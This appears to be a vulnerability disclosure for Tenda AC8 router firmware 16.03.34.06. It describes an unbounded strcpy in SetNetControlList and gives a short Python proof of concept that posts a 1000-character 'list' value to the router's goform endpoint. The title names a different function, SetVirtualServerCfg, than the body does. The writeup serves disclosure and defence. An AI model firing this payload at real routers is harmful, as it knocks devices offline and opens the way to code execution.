# **Buffer Overflow Vulnerability in SetVirtualServerCfg Function of AC8 Router Firmware US_AC8V4.0si_V16.03.34.06_cn_TDC01**

## 1. Description



**Stack Overflow Vulnerability in SetNetControlList Function of Tenda AC8 Firmware 16.03.34.06 (Updated 2024-11-29)**

A stack overflow vulnerability exists in the `SetNetControlList` function of the Tenda AC8 router firmware version 16.03.34.06 (updated 2024-11-29). Attackers can exploit this vulnerability to achieve denial of service or remote code execution attacks.

**【Download Link】**
https://www.tenda.com.cn/download/detail-3518.html

**【Update Date】**
2024-11-29

## **2. Analysis and Verification**

The vulnerability exists in the `SetNetControlList` function, where the program reads parameters from the `list` field.

<img width="1060" height="959" alt="image" src="https://github.com/user-attachments/assets/3a15b960-dc9f-4efa-b8b2-42569e9f334b" />


Further analysis reveals that in `set_qosMib_list`, parameters are passed to a buffer via `strcpy`. Due to the absence of length restrictions, this leads to a buffer overflow.
<img width="994" height="783" alt="image" src="https://github.com/user-attachments/assets/e28ebde9-a388-4942-981f-5d78d0e6ac2e" />



## 3. PoC

```
import requests

url = "http://192.168.67.135/goform/SetNetControlList"
data={

  "list":"a"*1000

}
res = requests.post(url=url,data=data)
print(res.content)
```

Running PoC for verification.
<img width="1393" height="105" alt="image" src="https://github.com/user-attachments/assets/3e2a21ba-4fa7-4e37-b603-2331bc00752e" />



## 4. **Remediation Recommendations**

Limit the byte length of input data.
